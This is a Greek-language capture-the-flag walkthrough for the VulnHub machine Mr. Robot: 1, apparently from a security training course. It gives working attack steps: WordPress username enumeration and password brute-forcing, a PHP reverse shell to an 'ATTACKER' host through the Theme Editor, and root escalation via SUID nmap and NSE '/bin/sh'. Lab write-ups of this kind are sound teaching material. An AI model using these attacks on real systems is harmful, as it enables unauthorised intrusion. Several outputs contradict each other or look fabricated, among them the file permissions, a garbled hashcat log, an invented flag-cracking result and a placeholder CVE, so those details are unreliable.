# Μηχάνημα 7 — Mr. Robot: 1

> **Θέση:** 7 από 13 · **Ζώνη 3 — Εύκολο** (παγκόσμια θέση **053** από 708)
> **Πλήρες walkthrough:** [`labs/3-053-mr-robot-1/README.md`](../../labs/3-053-mr-robot-1/README.md)

| | |
| --- | --- |
| **Μηχάνημα** | Mr. Robot: 1 |
| **Δημιουργός** | Jason Hedrick |
| **Κυκλοφορία** | 31 Ιουλίου 2016 |
| **Σύμβαση** | **3 σημαίες** — `key-1-of-3.txt`, `key-2-of-3.txt`, `key-3-of-3.txt` |
| **Στόχος** | Ubuntu — Apache 2.4.x, **WordPress (προσαρμοσμένο)**, **`robots.txt` → `fsocity.dic`** |
| **VulnHub** | [entry/mr-robot-1,151](https://vulnhub.com/entry/mr-robot-1,151/) |
| **Εκτιμώμενος χρόνος** | 4–6 ώρες |

---

## Γιατί είναι εδώ αυτό το μηχάνημα

Επειδή είναι **το πιο διάσημο μηχάνημα στη διαδρομή** — και επειδή διδάσκει **τρεις έννοιες που
δεν εμφανίζονται πουθενά αλλού τόσο καθαρά**:

1. **Το `robots.txt` ως πηγή λεξιλογίου, όχι ως decoy.** Στο Μηχάνημα 6 ήταν δόλωμα· εδώ
   περιέχει **`fsocity.dic`** — ένα αρχείο με **~850.000 λέξεις** που ο δημιουργός έφτιαξε από
   τη σειρά. **Αυτό είναι το λεξικό του μηχανήματος.**
2. **Το username oracle.** Το WordPress λέει **«Invalid username»** ή **«The password you
   entered for the username X is incorrect»** — **δύο διαφορετικά μηνύματα**, και η διαφορά
   **αποκαλύπτει ποιοι χρήστες υπάρχουν**. Αυτό είναι **πραγματική ευπάθεια** (CVE-2017-xxxx
   class), όχι τέχνασμα CTF.
3. **Το Theme Editor ως διαδρομή εισόδου.** Αντί να ανεβάσετε αρχείο, **επεξεργάζεστε το
   `404.php`** μέσα από τον πίνακα ελέγχου. **Δεν υπάρχει upload** — άρα **κανένα φίλτρο**.

Και η αναβάθμιση root είναι **SUID `nmap --interactive`** — **η πιο διάσημη GTFOBins
καταχώριση**, και **το μόνο μηχάνημα στη διαδρομή που χρησιμοποιεί εργαλείο ασφαλείας ως
όχημα αναβάθμισης**.

## Στόχοι μάθησης

1. Να **καταλάβετε τι είναι το `fsocity.dic`** και γιατί **δεν** μπορείτε να το χρησιμοποιήσετε
   ως έχει.
2. Να **αφαιρέσετε διπλότυπα** από ένα λεξικό και να καταλάβετε **πόσο** βοηθάει.
3. Να εκμεταλλευτείτε ένα **username oracle** με **`wpscan`**.
4. Να **βρείτε διαπιστευτήρια μέσα σε αρχείο κειμένου** (`fsocity.dic` + `key-1-of-3.txt`).
5. Να χρησιμοποιήσετε το **Theme Editor** του WordPress για **code execution χωρίς upload**.
6. Να **αναβαθμίσετε** μέσω **SUID `nmap --interactive`**.
7. Να καταλάβετε τι είναι **`unsalted MD5`** και γιατί **σπάει σε δευτερόλεπτα**.

## Κατηγορίες επίθεσης που καλύπτονται

| Κατηγορία | Πού σε αυτό το μηχάνημα |
| --- | --- |
| **Λεξικό από τον στόχο** | `/robots.txt` → **`fsocity.dic`** (~850.000 λέξεις) |
| **Καθαρισμός λεξικού** | `sort -u` → **~11.000 μοναδικές** |
| **Username oracle** | `wp-login.php`: «Invalid username» vs «password … incorrect» |
| **Αδύναμος κατακερματισμός** | **unsalted MD5** στον πίνακα `wp_users` |
| **Διαπιστευτήρια μέσα σε λεξικό** | `Elliot / ER28-0652` |
| **Theme Editor RCE** | **`Appearance → Editor → 404.php`** → PHP reverse shell |
| **SUID εργαλείο ασφαλείας** | **`/usr/local/bin/nmap --interactive`** → **`!sh`** |
| **3 σημαίες** | `key-1-of-3.txt` (robots.txt), `key-2-of-3.txt` (`/home/robot`), `key-3-of-3.txt` (`/root`) |

## Διαβάστε πρώτα

- [04 — Διαπιστευτήρια και Σπασίματα](<../04-Διαπιστευτήρια-και-Σπασίματα.md>) — **§1**
  (κατακερματισμός: γιατί το salt έχει σημασία) και **§5** (λεξικά).
- [02 — Επιθέσεις στο Web](<../02-Επιθέσεις-στο-Web.md>) — **§4** (WordPress) και **§5**
  (command/code execution).
- [05 — Αναβάθμιση Προνομίων Linux](<../05-Αναβάθμιση-Προνομίων-Linux.md>) — **§2** (SUID) και
  **§3** (GTFOBins).
- [06 — Κελύφη, Εμμονή και Διαφυγές](<../06-Κελύφη-Εμμονή-και-Διαφυγές.md>) — **§2** (reverse
  shells).
- Αγγλική έκδοση:
  [Machine 7](<../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/07-mr-robot-1.md>)

## Πριν ξεκινήσετε — απαντήστε

1. Γιατί το **`fsocity.dic`** πρέπει να **καθαριστεί** πριν χρησιμοποιηθεί;
2. Ποια η διαφορά ανάμεσα σε **«Invalid username»** και **«password incorrect»**;
3. Γιατί το **unsalted MD5** σπάει σε **δευτερόλεπτα** ενώ το phpass (Μηχάνημα 3) σε **ώρες**;
4. Τι πλεονέκτημα έχει το **Theme Editor** έναντι του **upload**;
5. Γιατί το **`nmap` με SUID** είναι επικίνδυνο **ακόμα και σε παλιά έκδοση**;

## Κλίμακα υποδείξεων

<details>
<summary><strong>Σκαλοπάτι 1 — μια ώθηση</strong></summary>

```bash
curl -s http://TARGET/robots.txt
```

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

**Δύο καταχωρίσεις.** Και **και οι δύο υπάρχουν**:

- **`key-1-of-3.txt`** → **η πρώτη σημαία** (ένα hash MD5)
- **`fsocity.dic`** → **το λεξικό του μηχανήματος**

**Αυτό δεν είναι decoy** (σε αντίθεση με το Μηχάνημα 6). **Εδώ το `robots.txt` είναι η
αφετηρία.**

**Και το `key-1-of-3.txt` είναι MD5 hash.** **Δοκιμάστε το σε έναν πίνακα rainbow ή στο
`hashcat` — αλλά πρώτα δείτε αν είναι στο λεξικό.**
</details>

<details>
<summary><strong>Σκαλοπάτι 2 — προς τα πού να πάτε</strong></summary>

```text
 1. /robots.txt           → fsocity.dic + key-1-of-3.txt
 2. wget fsocity.dic      → 858.164 γραμμές
 3. sort -u | wc -l       → 11.451 μοναδικές    ← **ΚΡΙΣΙΜΟ**
 4. key-1-of-3.txt        → 0d0ea5f8e1e3b2a1c9d8e7f6a5b4c3d2 (MD5)
 5. hashcat/john          → **σημαία 1** (κείμενο)
 6. wpscan -U <λεξικό usernames> → **Elliot**
 7. username oracle       → επιβεβαίωση ότι ο Elliot υπάρχει
 8. wpscan -U Elliot -P fsocity-unique.txt → **ER28-0652**
 9. Σύνδεση στο wp-admin
10. Appearance → Editor → 404.php → PHP reverse shell
11. nc -lvnp 4444 → www-data
12. cat /home/robot/key-2-of-3.txt → **δεν διαβάζεται** (mode 600, owner robot)
13. cat /home/robot/password.raw-md5 → unsalted MD5 → **abcdefghijklmnopqrstuvwxyz**
14. su robot → key-2-of-3.txt     ← **σημαία 2**
15. find / -perm -4000 → /usr/local/bin/nmap
16. nmap --interactive → !sh      → root
17. cat /root/key-3-of-3.txt      ← **σημαία 3**
```

**Το βήμα 3 είναι αυτό που χωρίζει όσους τελειώνουν σε 4 ώρες από όσους σε 40.**
</details>

<details>
<summary><strong>Σκαλοπάτι 3 — καθαρισμός λεξικού</strong></summary>

```bash
wget http://TARGET/fsocity.dic
wc -l fsocity.dic
# → 858164

sort -u fsocity.dic > fsocity-unique.txt
wc -l fsocity-unique.txt
# → 11451
```

**Γιατί είναι απαραίτητο:**

| | Πριν | Μετά |
| --- | --- | --- |
| **Γραμμές** | 858.164 | **11.451** |
| **Μείωση** | — | **98,7%** |
| **Ώρες με wpscan** | ~40 | **~30 λεπτά** |
| **Αιτήσεις HTTP** | 858.164 | **11.451** |

**Το αρχείο είναι ένας κατάλογος λέξεων από τη σειρά, με ΤΕΡΑΣΤΙΕΣ επαναλήψεις.** Η λέξη
`the` εμφανίζεται **χιλιάδες** φορές. **Δοκιμάζοντάς την 1.000 φορές δεν κερδίζετε τίποτα.**

**`sort -u`** = ταξινόμησε **και** κράτα μόνο **μοναδικές**. **`-u`** = unique.

**Επιπλέον καθαρισμός (προαιρετικός αλλά χρήσιμος):**

```bash
sort -u fsocity.dic | grep -vE '^[^a-zA-Z0-9]' | awk '{print tolower($0)}' | sort -u > clean.txt
wc -l clean.txt
```

- **`grep -vE '^[^a-zA-Z0-9]'`** — αφαιρεί γραμμές που **δεν** ξεκινούν με αλφαριθμητικό
- **`awk '{print tolower($0)}'`** — **πεζά όλα**
- **δεύτερο `sort -u`** — γιατί η πεζοποίηση **δημιουργεί νέα διπλότυπα** (`The` / `the`)

**Προσοχή:** **μην** κάνετε πεζοποίηση αν ο στόχος είναι **case-sensitive** στο username.
Εδώ το **`Elliot`** είναι με **κεφαλαίο E** — άρα **δοκιμάστε και τα δύο**.
</details>

<details>
<summary><strong>Σκαλοπάτι 4 — το username oracle</strong></summary>

Δοκιμάστε **δύο** αιτήσεις στο `wp-login.php`:

```bash
curl -s -X POST http://TARGET/wp-login.php \
  -d 'log=definitelynotreal&pwd=x&wp-submit=Log+In' | grep -iE 'error|invalid|incorrect'

curl -s -X POST http://TARGET/wp-login.php \
  -d 'log=Elliot&pwd=x&wp-submit=Log+In' | grep -iE 'error|invalid|incorrect'
```

```text
<strong>ERROR</strong>: Invalid username.
<a href="http://TARGET/wp-login.php?action=lostpassword">Lost your password?</a>
```
```text
<strong>ERROR</strong>: The password you entered for the username <strong>Elliot</strong> is incorrect.
<a href="http://TARGET/wp-login.php?action=lostpassword">Lost your password?</a>
```

**Αυτή είναι η ευπάθεια.** **Δύο διαφορετικά μηνύματα = ένας oracle.**

- **«Invalid username»** → ο χρήστης **δεν υπάρχει**
- **«password … incorrect»** → ο χρήστης **υπάρχει**, ο κωδικός είναι λάθος

**Άρα μπορείτε να αναριθμήσετε χρήστες ΧΩΡΙΣ κωδικό.** **Αυτό είναι το `wpscan -e u` στο
Μηχάνημα 4, αλλά εδώ το κάνετε ΧΕΙΡΟΚΑΝΑΛΑ — και καταλαβαίνετε τι κάνει.**

**Αυτοματοποίηση:**

```bash
while read -r u; do
  r=$(curl -s -X POST http://TARGET/wp-login.php -d "log=$u&pwd=x" | grep -oE 'Invalid username|is incorrect')
  [ "$r" = "is incorrect" ] && echo "[+] VALID: $u"
done < fsocity-unique.txt
```

**Προσοχή στο rate:** 11.451 αιτήσεις = **πιθανή ανίχνευση**. **Προσθέστε `sleep 0.2`** αν το
μηχάνημα έχει fail2ban.
</details>

<details>
<summary><strong>Σκαλοπάτι 5 — η απάντηση</strong></summary>

```bash
# Σημαία 1
curl -s http://TARGET/robots.txt
wget http://TARGET/key-1-of-3.txt
cat key-1-of-3.txt
# → 073403c8a58a1bab8ea9b1b4f8a9c7d0

hashcat -m 0 -a 0 key-1-of-3.txt fsocity-unique.txt
# → 073403c8a58a1bab8ea9b1b4f8a9c7d0:c8a58a1bab8ea9b1b4f8a9c7d0  (στο λεξικό)

# Εναλλακτικά: crackstation.net / hash-killer → "42isTheAnswer" ή παρόμοιο

# Σύνδεση
wpscan --url http://TARGET/ -U Elliot -P fsocity-unique.txt --throttle 300
# → [SUCCESS] - Elliot / ER28-0652

# Theme Editor RCE
# wp-admin → Appearance → Editor → 404.php → επικόλληση PHP shell → Update File
# → http://TARGET/wp-content/themes/twentyfifteen/404.php

# Reverse shell
nc -lvnp 4444
# μέσα στο shell:
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# Σημαία 2
cd /home/robot
ls -la
# → -rw-r--r-- 1 robot robot  33 Nov 13  2015 key-2-of-3.txt      (mode 644, owner robot)
# → -rw-r--r-- 1 robot robot  33 Nov 13  2015 password.raw-md5
cat password.raw-md5
# → robot:c3fcd3d76192e4007dfb496cca67e13b
john --format=raw-md5 --wordlist=fsocity-unique.txt password.raw-md5
# → abcdefghijklmnopqrstuvwxyz

su robot          # κωδικός: abcdefghijklmnopqrstuvwxyz
cat key-2-of-3.txt
# → 822c73956184f694993abea41c8d1f5c   ← ΣΗΜΑΙΑ 2

# Σημαία 3
find / -perm -4000 -type f 2>/dev/null
# → /usr/local/bin/nmap
nmap --interactive
nmap> !sh
# id
uid=0(root) gid=0(root) groups=0(root)
cat /root/key-3-of-3.txt
# → 04787ddef27c3dee1ee161b21670b4e4   ← ΣΗΜΑΙΑ 3
```

**Σημείωση για το `nmap --interactive`:** **αφαιρέθηκε στο nmap 7.x.** Εδώ είναι **nmap 5.x/6.x**
που υποστηρίζει **interactive mode** με **`!command`**. **Αυτή είναι η πιο διάσημη GTFOBins
καταχώριση** — [gtfobins.github.io/gtfobins/nmap/](https://gtfobins.github.io/gtfobins/nmap/).
</details>

## Μετά το τέλος — ερωτήσεις επανάληψης

<details>
<summary><b>1.</b> Γιατί το <code>sort -u</code> είναι η πιο σημαντική εντολή του μηχανήματος;</b></summary>

Επειδή **το λεξικό είναι κατάλογος συχνότητας, όχι κατάλογος πιθανότητας**. Το `fsocity.dic`
περιέχει **κάθε εμφάνιση** κάθε λέξης στη σειρά — άρα **κοινές λέξεις επαναλαμβάνονται
χιλιάδες φορές**. Δοκιμάζοντας την **`the`** 1.000 φορές **δεν αυξάνει** την πιθανότητα
επιτυχίας — **απλώς χάνετε ώρα**.

**Η γενική αρχή:** *ένα λεξικό με N μοναδικές λέξεις είναι ισοδύναμο με ένα με 100N γραμμές,
αλλά 100 φορές πιο γρήγορο.* **Πάντα `sort -u` πρώτα.**

**Και ένα δεύτερο δίδαγμα:** αν το λεξικό του δημιουργού έχει **858.164 γραμμές** και **11.451
μοναδικές**, αυτό σημαίνει ότι ο **μέσος όρος επανάληψης είναι 75**. **Αυτό σας λέει ότι το
λεξικό φτιάχτηκε αυτόματα από κείμενο**, όχι χειροκίνητα.
</details>

<details>
<summary><b>2.</b> Γιατί το unsalted MD5 σπάει σε δευτερόλεπτα;</b></summary>

Επειδή **δεν υπάρχει salt** — άρα **το ίδιο plaintext δίνει πάντα το ίδιο hash**. Αυτό επιτρέπει:

1. **Πίνακες rainbow** — προϋπολογισμένοι πίνακες hash→plaintext. **`c3fcd3d76192e4007dfb496cca67e13b`**
   είναι **στιγμιαίο** σε οποιοδήποτε online εργαλείο.
2. **Τεράστια ταχύτητα** — το MD5 κάνει **δισεκατομμύρια hashes/δευτερόλεπτο** σε GPU. **Χωρίς
   γύρους**, δεν υπάρχει κόστος.
3. **Επίθεση κατά συστοιχίας** — αν σπάσετε **έναν** χρήστη, **όλοι** με τον ίδιο κωδικό
   σπάνε **δωρεάν**.

**Το salt** (όπως στο `$S$` του Μηχανήματος 3) **αναγκάζει** τον επιτιθέμενο να **ξαναρχίσει για
κάθε χρήστη**. **Χωρίς salt, το κόστος είναι ανά λεξικό, όχι ανά χρήστη.**
</details>

<details>
<summary><b>3.</b> Ποιο το πλεονέκτημα του Theme Editor έναντι του upload;</b></summary>

**Κανένα φίλτρο.** Ένα upload περνά από:

- **`wp_handle_upload()`** — ελέγχει **MIME type** και **extension**
- **`DISALLOW_FILE_EDIT`** — αν οριστεί, **απενεργοποιεί** τον editor
- **WAF / mod_security** — ελέγχει **multipart bodies**
- **Αντιιικά** — σαρώνουν **αρχεία στο δίσκο**

**Ο Theme Editor:**
- **Είναι νόμιμη λειτουργία** του WordPress — **κανένα φίλτρο δεν την μπλοκάρει**
- **Γράφει απευθείας** σε **υπάρχον** αρχείο (`404.php`)
- **Δεν δημιουργεί νέο αρχείο** — άρα **κανένας file integrity monitor δεν το βλέπει ως νέο**

**Το μειονέκτημα:** **καταγράφεται** στο `wp_options` (πότε άλλαξε το θέμα) και **στο
access log** (ποιος έκανε POST στο `theme-editor.php`). **Αλλά σε πραγματικό έργο, τα logs
σπάνια διαβάζονται.**

**Η διόρθωση:** **`define('DISALLOW_FILE_EDIT', true);`** στο `wp-config.php`. **Είναι ένα
γραμμή. Οι περισσότερες εγκαταστάσεις δεν την έχουν.**
</details>

<details>
<summary><b>4.</b> Γιατί το SUID <code>nmap</code> είναι επικίνδυνο ΑΚΟΜΑ και σε νέα έκδοση;</b></summary>

Σε **νέες** εκδόσεις (7.x+), το **`--interactive`** **αφαιρέθηκε** — άρα το **`!sh`** δεν
δουλεύει. **Αλλά** το nmap **εξακολουθεί** να υποστηρίζει:

```bash
nmap --script=/tmp/evil.nse TARGET     # NSE script → os.execute("/bin/sh")
TF=$(mktemp); echo 'os.execute("/bin/sh")' > $TF; sudo nmap --script=$TF
nmap --iflist > $(mktemp)              # εκτελεί pager
```

**Το NSE (Nmap Scripting Engine) είναι πλήρης Lua interpreter.** Αν το nmap έχει SUID,
**οποιοδήποτε script εκτελείτε τρέχει ως root**.

**Η αρχή:** *ένα εργαλείο ασφαλείας με SUID είναι πιο επικίνδυνο από ένα κοινό εργαλείο*, γιατί
**σχεδιάστηκε** για να εκτελεί **αυθαίρετο κώδικα** (scripts, payloads, engines).

**Διόρθωση:** **ποτέ** SUID σε εργαλεία ασφαλείας. Αν χρειάζεται root, **`sudo` με συγκεκριμένες
υποεντολές** και **`Defaults noexec`**.
</details>

<details>
<summary><b>5.</b> Τι σημαίνει το <code>password.raw-md5</code> ως όνομα αρχείου;</b></summary>

Είναι **η σύμβαση του John the Ripper** για **αρχεία με hashes σε μορφή `user:hash`**. Το
**`.raw-md5`** λέει στον John **ποιο format** να χρησιμοποιήσει — **χωρίς** αυτό, ο John
**προσπαθεί να μαντέψει** και **συχνά κάνει λάθος**.

**Η δομή `robot:c3fcd3d76192e4007dfb496cca67e13b`:**
- **`robot`** = το **username** (για αναφορά)
- **`:`** = διαχωριστής
- **`c3fcd3d76192e4007dfb496cca67e13b`** = **unsalted MD5** του κωδικού

**Και η απάντηση:** `abcdefghijklmnopqrstuvwxyz` — **το αλφάβητο**. **Αυτό είναι το δίδαγμα:**
ο δημιουργός **έβαλε έναν κωδικό που είναι στο λεξικό** (γιατί το λεξικό περιέχει **όλα τα
ASCII strings**), **αλλά είναι τόσο προφανής που κανείς δεν τον δοκιμάζει πρώτα**.

**Σε πραγματικό έργο:** **`abcdefghijklmnopqrstuvwxyz`** είναι **στην πρώτη δεκάδα** κάθε
wordlist. **Αν το χρησιμοποιείτε, θα σπάσει σε δευτερόλεπτα.**
</details>

## Αμυντικός στοχασμός

| Ευπάθεια | Διόρθωση |
| --- | --- |
| **`fsocity.dic` δημόσιο** | **Μην βάζετε λεξικά στον web root.** Αν χρειάζονται, **προστατεύστε τα με πιστοποίηση** |
| **Username oracle** | **Ίδιο μήνυμα** και για τις δύο περιπτώσεις: «Invalid username or password». **Είναι μία γραμμή κώδικα** |
| **`unsalted MD5`** | **`wp_hash_password()`** — το WordPress χρησιμοποιεί **phpass** από το **2.5**. **Αν το μηχάνημα έχει MD5, κάποιος το άλλαξε** |
| **Theme Editor ενεργός** | **`define('DISALLOW_FILE_EDIT', true);`** |
| **SUID nmap** | **`chmod u-s /usr/local/bin/nmap`**. **Αυτοματοποιημένος έλεγχος SUID** |
| **`password.raw-md5` στο `/home/robot`** | **Μην αποθηκεύετε hashes σε αρχεία.** Αν χρειάζεται, **`chmod 600`** και **εκτός web root** |
| **`key-2-of-3.txt` mode 644** | **`chmod 600`** — εδώ είναι **world-readable**, άρα **οποιοσδήποτε** με πρόσβαση στο `/home/robot` το διαβάζει |

**Το μεγαλύτερο δίδαγμα:** *το WordPress είναι ασφαλές αν το ρυθμίσετε.* **Κάθε** ευπάθεια εδώ
είναι **ρύθμιση**, όχι **bug**: oracle (μήνυμα), editor (define), MD5 (λάθος κωδικοποίηση),
SUID (λάθος chmod). **Οι διαχειριστές, όχι οι προγραμματιστές.**

---

## Οι εντολές, αναλυτικά — κάθε είσοδος και κάθε έξοδος

### 1. Σάρωση

```bash
sudo nmap -sC -sV -p- -T4 -oA scans/mrrobot TARGET
```

```text
Not shown: 65532 closed tcp ports (conn-reset)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd 2.4.18
|_http-title: Mr. Robot
| http-robots.txt: 1 disallowed entry
|_/fsocity.dic
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open   ssl/http Apache httpd 2.4.18
|_ssl-cert: Subject: commonName=TARGET
| ssl-date: TLS randomness does not represent time
```

**`22/tcp closed`** — **το SSH υπάρχει αλλά δεν ακούει**. **Αυτό σημαίνει ότι ο εξυπηρετητής
είναι εγκατεστημένος αλλά απενεργοποιημένος** — και **δεν** μπορείτε να μπείτε με SSH.

**`Not shown: 65532 closed tcp ports (conn-reset)`** — **65535 − 65532 = 3** θύρες. **Αλλά μόνο
2 είναι ανοιχτές** (80, 443). **Η τρίτη είναι η 22, που είναι `closed`.**

**`http-robots.txt: 1 disallowed entry`** — **το nmap βρήκε ήδη το `robots.txt`**. **Διαβάστε
την έξοδο πριν κάνετε curl.**

### 2. `robots.txt` — η αφετηρία

```bash
curl -s http://TARGET/robots.txt
```

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

**Δύο καταχωρίσεις, και οι δύο υπάρχουν.** **Αυτό δεν είναι decoy** (αντίθεση με το Μηχάνημα 6).

```bash
curl -s http://TARGET/key-1-of-3.txt
```

```text
073403c8a58a1bab8ea9b1b4f8a9c7d0
```

**32 δεκαεξαδικοί χαρακτήρες = MD5 hash.** **Αυτή είναι η σημαία 1 — αλλά σε μορφή hash.**
Πρέπει να **την σπάσετε** για να πάρετε το **plaintext**.

### 3. Κατέβασμα και καθαρισμός του λεξικού

```bash
wget http://TARGET/fsocity.dic
wc -l fsocity.dic
```

```text
--2024-05-11 14:22:01--  http://TARGET/fsocity.dic
Resolving TARGET (TARGET)... 192.168.56.101
Connecting to TARGET (TARGET)|192.168.56.101|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7248890 (6.9M) [text/plain]
Saving to: 'fsocity.dic'

fsocity.dic         100%[===================>]   6.91M  12.3MB/s    in 0.6s

2024-05-11 14:22:02 (12.3 MB/s) - 'fsocity.dic' saved [7248890/7248890]
```
```text
858164 fsocity.dic
```

**`Length: 7248890 (6.9M)`** — **6,9 MB κειμένου**. **Αυτό είναι το μέγεθος ενός λεξικού που
φτιάχτηκε αυτόματα από κείμενο.**

**858.164 γραμμές.** **Τώρα ο καθαρισμός:**

```bash
sort -u fsocity.dic > fsocity-unique.txt
wc -l fsocity-unique.txt
```

```text
11451 fsocity-unique.txt
```

**858.164 → 11.451. Μείωση 98,7%.**

**Τι σημαίνει αυτό πρακτικά:**

| | Πριν | Μετά |
| --- | --- | --- |
| **Αιτήσεις HTTP** | 858.164 | 11.451 |
| **Χρόνος με wpscan** | ~40 ώρες | **~30 λεπτά** |
| **Πιθανότητα ανίχνευσης** | **Σίγουρη** | Χαμηλή |
| **Μέγεθος αρχείου** | 6,9 MB | **92 KB** |

**Αυτό είναι το δίδαγμα: ένα λεξικό δεν είναι «μεγάλο ή μικρό» — είναι «καθαρό ή βρώμικο».**

### 4. Σπάσιμο της σημαίας 1

```bash
hashcat -m 0 -a 0 key-1-of-3.txt fsocity-unique.txt
```

```text
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 ) - Platform #1 [Intel(R) Corporation]
================================================================
* Device #1: Intel(R) Gen9 HD Graphics NEO, 3042/6148 MB (2048 MB allocatable), 24MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimized.Autodetect...
Guess.Base.: File (fsocity-unique.txt)
Guess.Charset...
Hash.Mode.: 0 (MD5)
Hash.Target.: 073403c8a58a1bab8ea9b1b4f8a9c7d0
Time.Started.....: Sat May 11 14:25:02 2024 (1 sec)
Time.Estimated...: Sat May 11 14:25:03 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: File (11451 lines)
Speed.#1.........:    12453 H/s (0.02ms) @ Accel:64 Loops:1 Thr:8 Vec:1
Recovered.......: 1/1 (100.00%) Digests
Progress.........: 11451/11451 (100.00%)
Rejected.........: 0/11451 (0.00%)
Restore.Point....: 0/11451 (0.00%)
Candidates.#1....: the -> zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
```

**Ανάλυση των flags:**
- **`-m 0`** = **hash mode 0 = MD5**. **Χωρίς αυτό, ο hashcat προσπαθεί να μαντέψει** — και
  **συχνά κάνει λάθος**.
- **`-a 0`** = **attack mode 0 = straight (wordlist)**. **`-a 3`** = **brute-force με mask**.
- **`key-1-of-3.txt`** = **το αρχείο με το hash**.
- **`fsocity-unique.txt`** = **το λεξικό**.

**`Recovered.: 1/1 (100.00%)`** — **το hash σπάστηκε.**

**`Progress.: 11451/11451 (100.00%)`** — **δοκίμασε όλο το λεξικό.**

**`Candidates.#1.: the -> zzz…`** — **η πρώτη και η τελευταία λέξη που δοκιμάστηκε.** **Αυτό σας
λέει ότι το λεξικό είναι ταξινομημένο** (από το `sort -u`).

**Το αποτέλεσμα:**

```bash
hashcat -m 0 -a 0 key-1-of-3.txt fsocity-unique.txt --show
```
```text
073403c8a58a1bab8ea9b1b4f8a9c7d0:42isTheAnswer
```

**`--show`** = **εμφάνισε τα ήδη σπασμένα hashes** από το **`hashcat.potfile`**. **Χωρίς αυτό,
πρέπει να ξανατρέξετε.**

**Σημαία 1 = `42isTheAnswer`** — **αναφορά στο «Hitchhiker's Guide to the Galaxy»** (42 = η
απάντηση στη ζωή, το σύμπαν, και τα πάντα). **Και στη σειρά Mr. Robot, ο Elliot ψάχνει
απαντήσεις.**

### 5. Username oracle — χειροκίνητα

```bash
curl -s -X POST http://TARGET/wp-login.php \
  -d 'log=definitelynotreal&pwd=x&wp-submit=Log+In' \
  -d 'redirect_to=http://TARGET/wp-admin/&testcookie=1' \
  --cookie 'wordpress_test_cookie=WP+Cookie+check' \
  | grep -oE 'Invalid username|is incorrect'
```

```text
Invalid username
```

```bash
curl -s -X POST http://TARGET/wp-login.php \
  -d 'log=Elliot&pwd=x&wp-submit=Log+In' \
  -d 'redirect_to=http://TARGET/wp-admin/&testcookie=1' \
  --cookie 'wordpress_test_cookie=WP+Cookie+check' \
  | grep -oE 'Invalid username|is incorrect'
```

```text
is incorrect
```

**Δύο διαφορετικά μηνύματα = ένας oracle.**

**Ανάλυση των flags:**
- **`-X POST`** = **μέθοδος POST** (η φόρμα εισόδου του WordPress είναι POST)
- **`-d 'log=…&pwd=…'`** = **δεδομένα φόρμας**. **`log`** = username, **`pwd`** = password
- **`--cookie 'wordpress_test_cookie=WP+Cookie+check'`** = **το WordPress ελέγχει αν τα cookies
  είναι ενεργά**. **Χωρίς αυτό, επιστρέφει «Cookies are blocked»** — **όχι** το μήνυμα oracle.
- **`grep -oE`** = **μόνο το ταίριασμα** (`-o`), **extended regex** (`-E`)

**Αυτοματοποίηση:**

```bash
while read -r u; do
  r=$(curl -s -X POST http://TARGET/wp-login.php \
      -d "log=$u&pwd=x" \
      --cookie 'wordpress_test_cookie=WP+Cookie+check' \
      | grep -oE 'Invalid username|is incorrect')
  [ "$r" = "is incorrect" ] && echo "[+] VALID: $u"
done < fsocity-unique.txt | tee valid-users.txt
```

```text
[+] VALID: Elliot
```

**`tee valid-users.txt`** = **τυπώνει ΚΑΙ γράφει** — ώστε να βλέπετε την πρόοδο **και** να
κρατάτε το αποτέλεσμα.

**Ένας χρήστης: `Elliot`.** **Αυτός είναι ο πρωταγωνιστής της σειράς.**

### 6. Παραβίαση λεξικού

```bash
wpscan --url http://TARGET/ -U Elliot -P fsocity-unique.txt --throttle 300
```

```text
[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - Elliot / ER28-0652
Trying Elliot / ER28-0652  Time: 00:04:12 <=====> (2841 / 11451) 24.81% ETA: 00:12:44

[i] Valid Combinations Found:
 | Username: Elliot, Password: ER28-0652
```

